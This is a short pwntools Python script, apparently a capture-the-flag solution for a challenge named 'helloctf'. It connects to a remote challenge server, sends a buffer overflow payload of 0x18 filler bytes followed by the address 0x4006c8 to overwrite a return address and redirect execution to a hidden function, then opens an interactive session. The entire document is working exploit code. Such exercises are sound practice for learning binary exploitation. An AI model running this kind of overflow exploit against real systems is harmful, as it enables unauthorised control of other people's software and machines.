from pwn import *
context.arch = 'amd64'

#context.terminal = ['tmux', 'splitw', '-h']
#r = process('./helloctf')
#gdb.attach(r)

r = remote('140.115.59.7',11001)

r.recvlines(2)

u_cant_see_me = 0x4006c8

payload = flat('a' * 0x18, u_cant_see_me) 
r.sendline(payload)

r.interactive()
